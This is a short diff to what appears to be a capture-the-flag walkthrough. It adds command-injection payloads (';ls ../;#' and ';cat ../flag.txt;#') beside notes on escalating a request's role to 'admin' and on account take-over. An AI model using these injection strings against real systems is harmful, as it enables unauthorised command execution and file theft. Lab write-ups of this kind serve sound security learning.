@@ -40,6 +40,13 @@ In the Request promote Subscriptions and Role to `gold` and `admin`
 ```
 ;ls;#
 ```
+```
+;ls ../;#
+```
+```
+;cat ../flag.txt;#
+```
+
 
 ---
 ### Account Take-over
